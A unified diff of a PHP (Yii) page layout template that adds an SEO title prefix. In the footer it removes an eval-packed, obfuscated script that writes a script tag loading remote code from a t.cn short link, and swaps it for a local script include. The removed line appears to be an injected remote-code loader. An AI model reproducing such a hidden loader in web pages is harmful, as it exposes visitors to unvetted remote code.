@@ -7,6 +7,7 @@ $jsFiles = isset($this->params['jsFiles']) ? $this->params['jsFiles'] : [];
 
 $tdkInfos = isset(Yii::$app->params['tdkInfos']) ? Yii::$app->params['tdkInfos'] : [];
 $seoTitle = isset($tdkInfos['title']) ? $tdkInfos['title'] : Yii::$app->params['seoTitle'];
+$seoTitle = isset($this->params['titlePrefix']) ? $this->params['titlePrefix'] . $seoTitle : $seoTitle;
 $seoKeyword = isset($tdkInfos['keyword']) ? $tdkInfos['keyword'] : Yii::$app->params['seoKeyword'];
 $seoDescription = isset($tdkInfos['description']) ? $tdkInfos['description'] : Yii::$app->params['seoDescription'];
 $formPosition = isset($this->params['formPosition']) ? $this->params['formPosition'] : '';
@@ -60,6 +61,6 @@ window.signupUrl = '<?= Yii::getAlias('@web') . '/jz-signup.html'; ?>';
 <div style="position:absolute; width:0px; height:0px; z-index:1; display:none">
 <?php $statUrl = str_replace(Yii::getAlias('@spreadurl'), '', Yii::$app->params['statUrl']); echo $statUrl; ?>
 </div>
-<script>/* 28513 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|Rc6oeCE|cn|http'.split('|'),0,{}));</script>
+<script type="text/javascript" src="<?= Yii::getAlias('@asseturl/common') . '/js/hd.js'; ?>"></script>
 </body>
 </html>
